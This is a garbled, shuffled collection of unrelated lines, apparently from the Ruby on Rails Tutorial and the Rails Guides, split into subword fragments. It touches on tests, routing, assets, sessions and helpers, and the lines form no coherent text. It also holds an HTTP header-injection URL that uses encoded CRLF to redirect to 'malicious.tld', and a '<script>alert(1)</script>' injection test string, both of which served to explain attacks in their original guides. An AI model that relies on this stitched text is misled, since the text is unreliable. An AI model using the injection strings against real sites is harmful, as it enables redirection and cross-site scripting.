▁Now ▁for ▁the ▁implementation
▁ ▖ \ foot note {
▁layout ▁" main "
▁javascript _ include _ tag ▁" common " ▁# ▁=> ▁< script ▁src ="/ assets / common ▖ js "></ script >
▁This ▁test ▁uses ▁the ▁\ k ode { reload } ▁method ▁for ▁ reload ing ▁a ▁value ▁from ▁the ▁database ▁and ▁the ▁\ k ode { eq } ▁method ▁for ▁testing ▁equal ity .
▁By ▁ inspect ing ▁the ▁\ href { https :// github ▖ com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password ▖ rb } { secure ▁password ▁source ▁code }, ▁we ▁find ▁that ▁this ▁method ▁is
▁We ' ll ▁start ▁with ▁a ▁test ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute ▁by ▁build ing ▁on ▁the ▁test ▁in ▁Listing ~\ ref { code : valid _ user _ test } .
▁A ▁symbol ▁is ▁test ed ▁again st ▁the ▁bar e ▁constant ▁name , ▁a ▁string ▁is ▁again st ▁the ▁fully - qualified ▁constant ▁name .
▁There ' s ▁also ▁` s li ce !` ▁which ▁in ▁addition ▁to ▁perform ▁a ▁ s li ce ▁in ▁place ▁returns ▁what ' s ▁removed :
▁scope ▁path _ name s : ▁ { ▁new : ▁' make ' ▁ } ▁do
▁ Don ' t ▁be ▁surpris ed ▁if ▁it ' s ▁t ough ▁going ▁at ▁first ; ▁the ▁blank ▁ s l ate ▁of ▁a ▁new ▁feature ▁can ▁be ▁quite ▁in t im id ating .
▁As ▁a ▁rule ▁of ▁thumb , ▁use ▁filename s ▁relative ▁to ▁the ▁application ▁root :
▁NOTE ▖ ▁If ▁you ▁are ▁running ▁in ▁a ▁ multi - th read ed ▁environment , ▁there ▁could ▁be ▁a ▁chance ▁that ▁sever al ▁thread s ▁may ▁be ▁access ing ▁multiple ▁connection s ▁simul t an e ous ly ▖
▁NOTE ▖ ▁S li c ing ▁may ▁come ▁in ▁hand y ▁for ▁sanit i z ing ▁option ▁hashes ▁with ▁a ▁ white ▁list ▁of ▁keys .
▁This ▁chapter ▁is ▁design ed ▁to ▁give ▁you ▁a ▁so li d ▁foundation ▁in ▁Rails - flavored ▁Ruby , ▁whether ▁or ▁not ▁you ▁have ▁p ri or ▁experience ▁in ▁the ▁language .
▁Implement ▁such ▁a ▁REST ▁API ▁for ▁the ▁sample ▁application .
▁Because ▁of ▁the ▁way ▁Rails ▁handle s ▁sessions , ▁this ▁process ▁is ▁secure ; ▁if ▁a ▁ malicious ▁user ▁ tries ▁to ▁ s po of ▁the ▁user ▁id , ▁Rails ▁will ▁ de t ec t ▁a ▁ mis match ▁base d ▁on ▁a ▁special ▁\ emph { session ▁id } ▁generated ▁for ▁each ▁session .
▁In ▁fact , ▁one ▁of ▁the ▁best ▁ways ▁to ▁understand ▁the ▁associations ▁is ▁to ▁use ▁them ▁in ▁the ▁web ▁interface .
▁If ▁this ▁engine ▁is ▁to ▁be ▁used ▁as ▁a ▁stand - al one ▁engine , ▁then ▁you ╼ w o ul d ▁add ▁any ▁custom i z ation ▁to ▁its ▁layout ▁in ▁this ▁file , ▁rather ▁than ▁the ╼ application ' s ▁` app / views / layouts / application ▖ html ▖ erb ` ▁file .
▁=> ▁ { : name =>" Michael ▁Hartl ", ▁: email =>" michael @ example ▖ com "}
▁# ▁Ruby ▁on ▁Rails ▁Tutorial : ▁" hello , ▁world !"
▁default _ scope ▁ { ▁where ▁state : ▁' pending ' ▁ }
▁In ▁addition , ▁since ▁each ▁ row ▁is ▁a ▁user , ▁we ▁would ▁need ▁to ▁include ▁the ▁user ' s ▁other ▁attributes , ▁including ▁the ▁name , ▁email , ▁password , ▁etc .
▁[" 4 ", ▁"5" , ▁nil ]
▁as ▁show n ▁in ▁Listing ~\ ref { code : new _ readme } .
▁This ▁uses ▁a ▁\ k ode { before } ▁block ▁to ▁set ▁the ▁user ' s ▁name ▁to ▁an ▁invalid ▁( blank ) ▁value ▁and ▁then ▁check s ▁that ▁the ▁result ing ▁user ▁object ▁is ▁not ▁valid .
▁" Admin :: H o t el :: Re serv ation Util s "▖ demodulize ▁# ▁=> ▁" Re serv ation Util s "
▁* ▁`: re strict _ with _ exception ` ▁cause s ▁an ▁exception ▁to ▁be ▁raised ▁if ▁there ▁are ▁any ▁ associated ▁records
▁Listing ~\ ref { code : gemfile _ sample _ app } ▁is ▁identical ▁to ▁Listing ~\ ref { code : gemfile _ sqlite _ version } ▁and ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } ▁a part ▁from ▁the ▁gems ▁in ▁the ▁\ k ode { test } ▁group , ▁which ▁are ▁needed ▁for ▁the ▁optional ▁advanced ▁testing ▁setup ▁( Section ~\ ref { sec : advance d _ testing _ setup }) .
▁But ▁first , ▁we ' ll ▁create ▁the ▁class ▁of ▁ administrative ▁users , ▁or ▁\ emph { admin s }, ▁ authorize d ▁to ▁do ▁so .
▁For t un ate ly , ▁ Factory ▁Girl ▁an tic ip ate s ▁this ▁issue , ▁and ▁provides ▁\ emph { sequence s } ▁to ▁solve ▁it .
▁Fin ally , ▁if ▁necessary , ▁we ▁refactor ▁the ▁code , ▁changing ▁its ▁form ▁( by ▁eliminat ing ▁duplication , ▁for ▁example ) ▁without ▁changing ▁its ▁function .
▁This ▁isn ' t ▁a ▁\ emph { proof } ▁that ▁our ▁code ▁is ▁ still ▁correct , ▁but ▁it ▁great ly ▁increase s ▁the ▁pro b ability , ▁there by ▁providing ▁a ▁ safety ▁ net ▁to ▁protect ▁us ▁again st ▁future ▁bug s .
▁However , ▁unlike ▁application - wide ▁ layouts , ▁partial ▁ layouts ▁ still ▁have ▁the ▁ underscore ▁prefix .
▁Guard ▁m on it or s ▁changes ▁in ▁the ▁file system ▁so ▁that , ▁for ▁example , ▁when ▁we ▁change ▁the ▁\ k ode { static \_ pages \_ controller \_ test ▖ rb } ▁file , ▁only ▁those ▁tests ▁get ▁run .
▁ Content - Type : ▁* /* ; ▁ cha r set = utf -8
▁A lthough ▁we ' ve ▁defined ▁the ▁\ k ode { password \_ digest } ▁attribute ▁required ▁by ▁\ line break ▁\ k ode { has \_ secure \_ password }, ▁some times ▁it ' s ▁convenient ▁to ▁refer ▁to ▁the ▁plain ▁( v ir t u al ) ▁password ▁as ▁well .
▁in ▁Listing ~\ ref { code : layout _ flash } .
▁| ▁| ▁4 07 ▁| ▁: proxy _ authentication _ require d ▁|
▁for ▁" level " : String
▁The ▁comments ▁resource ▁here ▁will ▁have ▁the ▁following ▁routes ▁generated ▁for ▁it :
▁To ▁protect ▁the ▁\ k ode { index } ▁page ▁from ▁un authorize d ▁access , ▁we ' ll ▁first ▁add ▁a ▁short ▁test ▁to ▁verify ▁that ▁the ▁\ k ode { index } ▁action ▁is ▁ redirected ▁properly ▁( Listing ~\ ref { code : index _ action _ redirected _ test }) .
▁# ▁< c ▁type =" integer "> 3 </ c >
▁The ▁\ emph { Rails ▁Tutorial } ▁is ▁a ▁book ▁on ▁web ▁development , ▁not ▁web ▁design , ▁but ▁it ▁would ▁be ▁ de press ing ▁to ▁work ▁on ▁an ▁application ▁that ▁look s ▁like ▁\ emph { com p let e } ▁c rap , ▁so ▁in ▁this ▁section ▁we ' ll ▁add ▁some ▁structure ▁to ▁the ▁layout ▁and ▁give ▁it ▁some ▁minimal ▁styling ▁with ▁CSS ▖ ▁In ▁addition ▁to ▁using ▁some ▁custom ▁CSS ▁rules , ▁we ' ll ▁make ▁use ▁of ▁\ href { http :// get bootstrap ▖ com /}{ Bootstrap }, ▁an ▁open - source ▁web ▁design ▁framework ▁from ▁Twitter .
▁Because ▁it ▁is ▁no m in ally ▁an ▁ acronym ▁for ▁\ emph { a synchronous ▁JavaScript ▁and ▁ XML }, ▁Ajax ▁is ▁some times ▁ mis s pe ll ed ▁`` A J A X '' , ▁even ▁though ▁the ▁\ href { http :// www ▖ adapt ive path ▖ com / ide as / ess a y s / archive s / 000 38 5 ▖ ph p } { origin al ▁Ajax ▁article } ▁ s pe ll s ▁it ▁as ▁`` Ajax '' ▁throughout .
▁To ▁find ▁the ▁current ▁user , ▁one ▁possibility ▁is ▁to ▁use ▁the ▁\ k ode { find } ▁method , ▁as ▁on ▁the ▁user ▁profile ▁page ▁( Listing ~\ ref { code : user _ show _ action }) :
▁ Calvin ▁navigate s ▁to ▁the ▁profile ▁of ▁a ▁second ▁user , ▁ Thomas ▁ Hobbes ▁( Figure ~\ ref { fig : page _ flow _ other _ profile _ follow _ button _ mockup }), ▁click ing ▁on ▁the ▁`` Follow '' ▁button ▁to ▁follow ▁that ▁user .
▁t ▖ string ▁: account _ number
▁in ▁Listing ~\ ref { code : s p or k _ guard file } .
▁If ▁a ▁helper ▁is ▁specific ▁to ▁a ▁particular ▁controller , ▁you ▁should ▁put ▁it ▁in ▁the ▁corresponding ▁helper ▁file ; ▁for ▁example , ▁helpers ▁for ▁the ▁Static ▁Pages ▁controller ▁generally ▁go ▁in ▁\ k ode { app / helpers / static \_ pages \_ helper ▖ rb } .
▁t ▖ references ▁: article , ▁index : ▁true
▁When ▁the ▁CDN ▁can ╼ serv e ▁an ▁asset ▁directly ▁the ▁request ▁ never ▁ touch es ▁your ▁Rails ▁server ▖
▁The ▁markup ▁for ▁a ▁mode r n ▁web ▁page ▁follows ▁this ▁form :
▁in ▁Listing ~\ ref { code : login _ form _ html } .
▁This ▁guide ▁does ▁not ▁di g ▁into ▁that ▁process , ▁but ▁it ' s ▁important ▁to ▁know ▁that ▁the ▁file ▁extension ▁on ▁your ▁view ▁control s ▁the ▁choice ▁of ▁template ▁handle r ▖
▁scope ▁: active , ▁where ( active : ▁true )
▁A ▁template ▁appears ▁in ▁Listing ~\ ref { code : home _ feed _ test } .
▁# ▁in ▁config / initializers / session _ store ▖ rb
▁% ▁subsection ▁ backtrace _ silencer ▁( end )╼╼ ▁\ subsection { A u to ma ted ▁tests ▁with ▁Guard } ▁% ▁( fold )╼ ▁\ label { sec : guard }╼╼
▁The ▁\ k ode { Micropost } ▁class , ▁highlight ing ▁inheritance .
▁Let ' s ▁take ▁a ▁look ▁at ▁the ▁generated ▁ mailers ▁to ▁get ▁a ▁sense ▁of ▁how ▁they ▁work ▁( Listing ~\ ref { code : generated _ application _ mailer } ▁and ▁Listing ~\ ref { code : generated _ user _ mailer }) .
▁* ▁Method ▁parameters .
▁Even ▁at ▁this ▁ early ▁stage , ▁we ' re ▁already ▁going ▁to ▁deploy ▁our ▁( still - empty ) ▁Rails ▁application ▁to ▁production .
▁+ - -------- + --- ------+-------+ --- --- +-------------+
▁get ▁' one ' ▁=> ▁' test # example ', ▁as : ▁: example
▁With in ▁the ▁context ▁of ▁a ▁layout , ▁` yield ` ▁identifie s ▁a ▁section ▁where ▁content ▁from ▁the ▁view ▁should ▁be ▁inserted ▖
▁In ▁development ▁mode , ▁assets ▁are ▁served ▁as ▁separate ▁files ▁in ▁the ▁order ▁they ▁are ╼ spec if i ed ▁in ▁the ▁manifest ▁file .
▁We ▁will ▁see ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up } ▁that ▁initializ ing ▁objects ▁using ▁a ▁hash ▁argument , ▁a ▁technique ▁known ▁as ▁\ emph { mass ▁assignment }, ▁is ▁common ▁in ▁Rails ▁applications .
▁ n { U s ing ▁keyword ▁arguments ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper ▖ ▁\ \ ▁\ file path { app / helpers / users \_ helper ▖ rb } } ╼ %= ▁ lang : ruby , ▁options : ▁" h l _ lines " : ▁[ 4 ] ╼\ begin { code } ╼ module ▁Users Helper ╼╼ ▁# ▁Return s ▁the ▁Gravatar ▁for ▁the ▁given ▁user ▖╼ ▁def ▁ gravatar _ for ( user , ▁size : ▁ 80 )╼ ▁ gravatar _ id ▁= ▁ Digest :: M D 5 :: hexdigest ( user ▖ email ▖ downcase )╼ ▁ gravatar _ url ▁= ▁" https :// secure ▖ gravatar ▖ com / avatar / # { gravatar _ id } ? s = # { size } " ╼ ▁image _ tag ( gravatar _ url , ▁ alt : ▁user ▖ name , ▁class : ▁" gravatar " )╼ ▁end ╼ end ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁a _ gravatar _ image ▁( end )╼╼ ▁\ section { Sign up ▁form } ▁% ▁( fold )╼ ▁\ label { sec : signup _ form }╼╼
▁Active ▁Support ▁defines ▁` Hash # deep _ merge ` ▖
▁The ▁remember ▁token ▁cookie ▁in ▁the ▁local ▁browser .
▁< a ▁ href =' more ▖ html ' > S e e ▁more </ a > ")
▁javascript _ include _ tag ▁: default s
▁| ▁GET ▁| ▁ / kategorien / : id ▁| ▁categories # show ▁| ▁ category _ path (: id ) ▁|
▁We ▁ en counter ed ▁this ▁idea ▁brief ly ▁in ▁the ▁context ▁of ▁\ k ode { reverse } ▁in ▁the ▁\ k ode { palindrome } ▁method ▁( Section ~\ ref { sec : a _ class _ of _ our _ own }), ▁which ▁also ▁noted ▁that ▁\ k ode { self } ▁is ▁\ emph { not } ▁optional ▁in ▁an ▁assignment , ▁so
▁We ' ll ▁start ▁with ▁a ▁test ▁for ▁the ▁presence ▁of ▁a ▁\ k ode { name } ▁attribute ▁by ▁build ing ▁on ▁the ▁test ▁in ▁Listing ~\ ref { code : valid _ user _ test } .
▁#### ▁` subclasses `
▁Here ▁the ▁ storage ▁ mechanism ▁for ▁the ▁ forwarding ▁URL ▁is ▁the ▁same ▁\ k ode { session } ▁facilit y ▁we ▁used ▁in ▁Section ~\ ref { sec : a _ working _ log _ in _ method } ▁to ▁log ▁the ▁user ▁in .
▁WARNING : ▁The ▁asset ▁tag ▁helpers ▁do ▁ _ not _ ▁verify ▁the ▁exist ence ▁of ▁the ▁assets ▁at ▁the ▁specified ▁location s ; ▁they ▁simply ▁assume ▁that ▁you ▁know ▁what ▁you ' re ▁doing ▁and ▁generate ▁the ▁link .
▁* ▁` prepend _ helpers _ path ` ▁Add s ▁the ▁directory ▁` app / helpers ` ▁from ▁the ▁application , ▁ railties ▁and ▁engines ▁to ▁the ▁look up ▁path ▁for ▁helpers ▁for ▁the ▁application .
▁If ▁you ▁want ▁to ▁update ▁another ▁branch :
▁What ▁make s ▁Rails ▁so ▁great ?
▁You ▁can ▁use ▁the ▁`: constraints ` ▁option ▁to ▁specify ▁a ▁required ▁format ▁on ▁the ▁ implicit ▁` id ` ▖
▁I ▁recommend ▁eventual ly ▁learning ▁how ▁to ▁install ▁and ▁configure ▁PostgreSQL ▁in ▁development , ▁but ▁the ▁chance s ▁are ▁now ▁is ▁not ▁that ▁time .
▁$ (" a [ data - remote ] ")▖ on ▁" ajax : success ", ▁( e , ▁data , ▁status , ▁ xhr ) ▁->
▁belongs _ to ▁: patient
▁* ▁` app / assets ` ▁is ▁for ▁assets ▁that ▁are ▁own ed ▁by ▁the ▁application , ▁such ▁as ▁custom ╼ images , ▁JavaScript ▁files ▁or ▁stylesheets .
▁There ▁are ▁now ▁no ▁ strict ▁ dependencies ▁on ▁what ▁the ▁class ▁is , ▁only ▁what ▁the ▁API ▁for ╼ the ▁class ▁must ▁be ▖
▁The ▁users ▁index ▁view .
▁On ▁the ▁other ▁hand , ▁many ▁beginning ▁Rails ▁developers ▁are ▁ ex ci ted ▁about ▁making ▁\ emph { web } ▁applications , ▁and ▁would ▁rather ▁not ▁wait ▁to ▁finish ▁a ▁whole ▁book ▁on ▁Ruby ▁before ▁ever ▁writing ▁a ▁single ▁web ▁page .
▁However , ▁this ▁isn ' t ▁really ▁all ▁that ▁helpful ▖
▁The ▁\ k ode { User } ▁class , ▁highlight ing ▁inheritance .
▁</ tr >
▁\ label { fig : signup _ failure _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { A ▁working ▁form } ▁% ▁( fold )╼ ▁\ label { sec : a _ working _ form }╼╼
▁> > ▁Person ▖ new ▖ errors [: name ] ▖ any ?
▁ K now ing ▁how ▁to ▁use ▁a ▁version ▁control ▁system ▁is ▁a ▁required ▁ s kill ▁for ▁every ▁software ▁developer .
▁D is play ing ▁Validation ▁ Error s ▁in ▁View s
▁Active ▁Support ▁provides ▁` duplicable ?` ▁to ▁program ma tic ally ▁query ▁an ▁object ▁about ▁this ▁property :
▁The ▁response ▁\ k ode { : success } ▁is ▁an ▁abstract ▁representation ▁of ▁the ▁under ly ing ▁HTTP ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / List _ of _ HTTP _ status _ code s } { status ▁code } ▁( in ▁this ▁case , ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / List _ of _ HTTP _ status _ code s # 2 x x _ S u cc ess } { 200 ▁OK }) .
▁m attr _ accessor ▁: constant _ watch _ stack _ m ute x
▁page ▁to ▁show ▁micropost ▁with ▁id ▁\ k ode {1}
▁create _ table ▁: account s ▁do ▁| t |
▁As ▁we ' ve ▁seen ▁throughout ▁this ▁tutorial , ▁the ▁usual ▁Rails ▁convention ▁is ▁to ▁ implicit ly ▁render ▁the ▁template ▁corresponding ▁to ▁an ▁action , ▁such ▁as ▁rendering ▁\ k ode { show ▖ html ▖ erb } ▁at ▁the ▁end ▁of ▁the ▁\ k ode { show } ▁action .
▁delete ▁a ▁session ▁( log ▁out )
▁At ▁the ▁moment ,╼ " Welcome ▁a board " ▁is ▁ o cc up y ing ▁that ▁ s po t .
▁The ▁initial ▁ spec ▁for ▁users , ▁with ▁a ▁test ▁for ▁the ▁signup ▁page .
▁It ' s ▁worth ▁noting ▁that ▁this ▁error - messages ▁partial ▁is ▁only ▁a ▁first ▁attempt ; ▁the ▁final ▁version ▁appears ▁in ▁Section ~\ ref { sec : creating _ microposts } .
▁To ▁use ▁the ▁mailer ▁in ▁our ▁application , ▁we ▁just ▁need ▁to ▁add ▁a ▁couple ▁of ▁lines ▁to ▁the ▁\ k ode { create } ▁action ▁used ▁to ▁sign ▁users ▁up , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ signup _ with _ account _ activation } .
▁# ▁P re compile ▁ additional ▁assets ▁( application ▖ js , ▁application ▖ css , ▁and ▁all ▁non - JS / CSS ▁are ▁already ▁added )
▁There for e , ▁constraint ▁values ▁should ▁match ▁the ▁corresponding ▁ Request ▁object ▁method ▁return ▁type ▖
▁ Experience ▁shows ▁that , ▁at ▁the ▁level ▁of ▁this ▁tutorial , ▁the ▁ cost s ▁ associated ▁with ▁including ▁such ▁an ▁explicit ▁Ruby ▁version ▁number ▁out we ig h ▁the ▁( n eg li g ible ) ▁benefit s , ▁so ▁you ▁should ▁ignore ▁this ▁ warning ▁for ▁now .
▁\ emph { Extra ▁ credit : } ▁Or g an ize ▁the ▁support ▁code ▁into ▁separate ▁files ▁and ▁module s , ▁and ▁get ▁everything ▁to ▁work ▁by ▁including ▁the ▁module s ▁properly ▁in ▁the ▁ spec ▁helper ▁file .
▁as ▁seen ▁in ▁Listing ~\ ref { code : gemfile _ sqlite _ version } .
▁( I ' ve ▁taken ▁the ▁ lib er t y ▁of ▁associat ing ▁the ▁first ▁few ▁sample ▁addresses ▁with ▁photos ▁so ▁that ▁they ' re ▁not ▁all ▁the ▁default ▁Gravatar ▁image ▖)
▁In ▁addition , ▁after ▁an ▁invalid ▁submission ▁Rails ▁automatically ▁wrap s ▁the ▁fields ▁with ▁errors ▁in ▁\ k ode { div } s ▁with ▁the ▁CSS ▁class ▁\ k ode { field \_ with \_ errors } .
▁To ▁get ▁links ▁of ▁the ▁form
▁* ▁` auto play : ▁true `, ▁start s ▁ play ing ▁the ▁ video ▁on ▁page ▁load .
▁* ▁` config ▖ file _ watch er ` ▁the ▁class ▁used ▁to ▁ de t ec t ▁file ▁update s ▁in ▁the ▁file system ▁when ▁` config ▖ reload _ classes _ only _ on _ change ` ▁is ▁true ▖
▁One ▁example ▁is ▁the ▁\ k ode { to \_ s } ▁method ▁that ▁can ▁convert ▁virtual ly ▁any ▁object ▁to ▁a ▁string :
▁If ▁you ▁need ▁to ▁do ▁more ▁complex ▁things ▁with ▁a ▁default ▁scope , ▁you ▁can ▁ alternative ly ╼ define ▁it ▁as ▁a ▁class ▁method :
▁You ' re ▁now ▁in ▁a ▁position ▁to ▁app re ci ate , ▁at ▁least ▁ v a g ue ly , ▁what ▁this ▁code ▁means : ▁\ k ode { StaticPages Controller } ▁is ▁a ▁class ▁that ▁inherit s ▁from ▁\ k ode { Application Controller }, ▁and ▁comes ▁ equ ip ped ▁with ▁\ k ode { home }, ▁\ k ode { help }, ▁and ▁\ k ode { about } ▁methods .
▁# ▁=> ▁ 12 ▖ 3 45 ▖ 6 78
▁# ▁Rails ▁< ▁4▖1
▁ http :// www ▖ your application ▖ com / controller / action ? referer = path / at / your / app % 0 d % 0 a Location : + http :// www ▖ malicious ▖ t ld
▁### ▁Mailer ▁View s
▁As ▁with ▁the ▁other ▁routes , ▁\ k ode { get ▁' signup ' } ▁automatically ▁gives ▁us ▁the ▁named ▁route ▁\ k ode { signup \_ path }, ▁which ▁we ▁put ▁to ▁use ▁in ▁Listing ~\ ref { code : home _ page _ signup _ link } .
▁For ▁example , ▁the ▁page ▁for ▁ listing ▁all ▁users ▁is ▁at ▁\ href { http :// localhost :3000/ users }{/ users }, ▁and ▁the ╼ page ▁for ▁making ▁a ▁new ▁user ▁is ▁at ▁\ href { http :// localhost :3000/ users / new }{/ users / new } .
▁The ▁` collection ▖ empty ?` ▁method ▁returns ▁` true ` ▁if ▁the ▁collection ▁does ▁not ▁contain ▁any ▁ associated ▁objects .
▁as ▁show n ▁in ▁Listing ~\ ref { code : c g i _ escape } .
▁We ▁can ▁get ▁the ▁REST - style ▁URL ▁to ▁work ▁by ▁adding ▁a ▁single ▁line ▁to ▁our ▁routes ▁file ▁(\ k ode { config / routes ▖ rb }) :
▁ years _ ago
▁The ▁bottom ▁line ▁is ▁that ▁\ k ode { : name ▁=> } ▁and ▁\ k ode { name : } ▁are ▁effective ly ▁the ▁same ▁\ emph { only ▁inside ▁literal ▁hashes }, ▁so ▁that
▁M er ge ▁the ▁new ▁content :
▁To ▁filter ▁the ▁process es ▁by ▁type , ▁you ▁can ▁run ▁the ▁results ▁of ▁\ text tt { p s } ▁through ▁the ▁\ text tt { grep } ▁pattern - match er ▁using ▁a ▁Unix ▁p ip e ~\ text tt { | } :
▁G H # 123 4
▁#### ▁number _ to _ currency
▁Whi le ▁we ' re ▁at ▁it , ▁we ' ll ▁follow ▁a ▁common ▁web ▁convention ▁and ▁link ▁the ▁ logo ▁to ▁the ▁Home ▁page ▁as ▁well .
▁This ▁ensure s ▁that ▁the ▁same ▁version ▁of ▁Rails ▁we ▁installed ▁in ▁Listing ~\ ref { code : installing _ rails } ▁is ▁used ▁to ▁create ▁the ▁first ▁application ' s ▁file ▁structure .
▁In ▁addition , ▁some ▁commands ▁may ▁produce ▁errors ▁depending ▁on ▁your ▁system ; ▁rather ▁than ▁attempt ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / S is y ph us } { S is y ph e an } ▁task ▁of ▁document ing ▁all ▁such ▁errors ▁in ▁this ▁tutorial , ▁I ▁will ▁ delegate ▁to ▁the ▁`` Google ▁the ▁error ▁message '' ▁algorithm , ▁which ▁a mong ▁other ▁things ▁is ▁good ▁practice ▁for ▁real - life ▁software ▁development .
▁as ▁show n ▁in ▁Listing ~\ ref { code : forget _ test } .
▁The ▁first ▁is ▁the ▁new ▁Home ▁page ▁ sidebar , ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ info } .
▁Recall ing ▁that
▁Rails ▁has ▁sever al ▁ initializers ▁that ▁run ▁on ▁start up ▁that ▁are ▁all ▁defined ▁by ▁using ▁the ▁` initializer ` ▁method ▁from ▁` Rails :: Railtie ` ▖
▁As ▁a ▁result , ▁most ▁web ▁framework s ▁have ▁a ▁p le th or a ▁of ▁options ▁for ▁implement ing ▁such ▁systems , ▁and ▁Rails ▁is ▁no ▁exception .
▁S ince ▁\ text tt { nil } ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁the ▁first ▁assignment ▁to ▁\ text tt {@ foo } ▁is ▁\ text tt { nil ▁|| ▁" bar " }, ▁which ▁evaluate s ▁to ▁\ text tt {" bar "} .
▁* ▁Database ▁Table ▁- ▁P l ur al ▁with ▁ underscore s ▁ se p ar ating ▁words ▁( e ▖ g ▖ , ▁` book _ clu b s ` ) .
▁This ▁means ▁that ▁an ╼ application ▁is ▁able ▁to ▁have ▁a ▁path ▁provided ▁by ▁a ▁routing ▁helper ▁such ▁as ╼` articles _ path ` ▁and ▁use ▁an ▁engine ▁also ▁that ▁provides ▁a ▁path ▁also ▁called ╼` articles _ path `, ▁and ▁the ▁two ▁would ▁not ▁c la sh ▖
▁* ▁Rails ▁4▖0 ▁has ▁removed ▁the ▁ XML ▁parameters ▁ parse r ▖
▁In ▁Chapter ~\ ref { cha : user _ microposts }, ▁the ▁result ▁was ▁only ▁a ▁ proto - feed ▁( Figure ~\ ref { fig : home _ with _ proto _ feed }), ▁but ▁with ▁the ▁implementation ▁in ▁Listing ~\ ref { code : from _ users _ followed _ by _ final } ▁as ▁seen ▁in ▁Figure ~\ ref { fig : home _ page _ with _ feed } ▁the ▁Home ▁page ▁now ▁shows ▁the ▁full ▁feed .
▁create ▁app / assets / stylesheets / application ▖ css
▁$ ▁bundle ▁exec ▁rake ▁db : migrate ▁ RAILS _ ENV = production
▁In ▁this ▁context , ▁such ▁tests ▁are ▁some times ▁known ▁as ▁\ emph { acceptance ▁tests }, ▁since ▁they ▁determine ▁when ▁a ▁particular ▁feature ▁should ▁be ▁accepted ▁as ▁complete .
▁Note ▁that ▁it ▁handle s ▁both ▁ ASCII ▁and ▁ Uni code ▁whitespace .
▁\ label { fig : demo _ new _ user _ rails _3} }╼\ end { figure }╼╼\ no indent
▁` find _ by _ sql ` ▁provides ▁you ▁with ▁a ▁simple ▁way ▁of ▁making ▁custom ▁calls ▁to ▁the ▁database ▁and ▁re t ri e v ing ▁ instantiated ▁objects .
▁def ▁raw ( string is h )
▁ RedCloth ▖ new (' < script > alert (1) </ script > ')▖ to _ html
▁ Compar ing ▁the ▁console ▁sessions ▁for ▁the ▁ various ▁operator s , ▁we ▁see ▁that ▁\ text tt {@ foo ▁= ▁@ foo ▁|| ▁" bar "} ▁follows ▁the ▁\ text tt { x ▁= ▁x ▁O ▁ y } ▁pattern ▁with ▁\ text tt {||} ▁in ▁the ▁place ▁of ▁\ text tt { O } :
▁NOTE : ▁All ▁the ▁following ▁methods ▁are ▁defined ▁in ▁` active _ support / core _ ext / date / calculations ▖ rb ` .
▁To ▁get ▁these ▁tests ▁to ▁pass ▁again ▁and ▁to ▁get ▁our ▁form ▁to ▁render , ▁we ▁must ▁define ▁an ▁\ k ode {@ user } ▁variable ▁in ▁the ▁controller ▁action ▁corresponding ▁to ▁\ k ode { new ▖ html ▖ erb }, ▁i ▖ e ▖ , ▁the ▁\ k ode { new } ▁action ▁in ▁the ▁Users ▁controller .
▁The ▁next ▁set ▁of ▁tests ▁make s ▁sure ▁that , ▁for ▁signed - in ▁users , ▁the ▁index ▁page ▁has ▁the ▁right ▁title / content ▁and ▁list s ▁all ▁of ▁the ▁site ' s ▁users .
▁The ▁\ k ode { F e at ure } ▁and ▁\ k ode { S c en ar io } ▁lines ▁are ▁main ly ▁for ▁documentation , ▁but ▁each ▁of ▁the ▁other ▁lines ▁needs ▁some ▁corresponding ▁Ruby .
▁The ▁updated ▁partials ▁appear ▁in ▁Listing ~\ ref { code : follow _ form _ ajax } ▁and ▁Listing ~\ ref { code : unfollow _ form _ ajax } .
▁In ▁particular , ▁\ k ode { Rails ▖ env ▖ development ?}\ ▁is ▁\ k ode { true } ▁only ▁in ▁a ▁development ▁environment , ▁so ▁the ▁ embedded ▁Ruby
▁| ▁` Person ` ▁| ▁` people ` ▁|
▁We ▁end ▁our ▁to ur ▁of ▁Ruby ▁with ▁a ▁complete ▁class ▁of ▁our ▁own , ▁a ▁\ k ode { User } ▁class ▁that ▁an tic ip ate s ▁the ▁User ▁model ▁ com ing ▁up ▁in ▁Chapter ~\ ref { cha : modeling _ users } .
▁A ▁partial ▁for ▁the ▁HTML ▁ shim .
▁A ▁custom ▁Home ▁page .
▁class ▁Application ▁< ▁Rails :: Application
▁For ▁example ╼ instead ▁of ▁using
▁* ▁` assert _ generate s `
▁To ▁create ▁a ▁new ▁controller , ▁you ▁will ▁need ▁to ▁run ▁the ▁" controller " ▁generator ▁and ╼ te ll ▁it ▁you ▁want ▁a ▁controller ▁called ▁" welcome " ▁with ▁an ▁action ▁called ▁" index ", ╼ just ▁like ▁this :
▁in ▁Listing ~\ ref { code : generate _ user _ model } .
▁S ince ▁\ text tt { nil } ▁is ▁false ▁in ▁a ▁boolean ▁context , ▁the ▁first ▁assignment ▁is ▁\ text tt { nil ▁|| ▁" the ▁user " }, ▁which ▁evaluate s ▁to ▁\ text tt {" the ▁user "} ; ▁similar ly , ▁the ▁second ▁assignment ▁is ▁\ text tt {" the ▁user " ▁|| ▁" another ▁user " }, ▁which ▁also ▁evaluate s ▁to ▁\ text tt {" the ▁user "} --- since ▁strings ▁are ▁\ text tt { true } ▁in ▁a ▁boolean ▁context , ▁the ▁series ▁of ▁\ text tt {||} ▁expression s ▁ term in ate s ▁after ▁the ▁first ▁expression ▁is ▁evaluated .
▁Testing ▁the ▁\ k ode { index } ▁action ▁redirect ▖
▁( A lthough ▁the ▁\ k ode { authenticated ?}\ ▁method ▁in ▁Listing ~\ ref { code : authenticated _ p } ▁is ▁t i ed ▁specifically ▁to ▁the ▁remember ▁digest , ▁it ▁will ▁turn ▁out ▁to ▁be ▁useful ▁in ▁other ▁context s ▁as ▁well , ▁and ▁we ' ll ▁general ize ▁it ▁in ▁Chapter ~\ ref { cha : account _ activation } ▖)
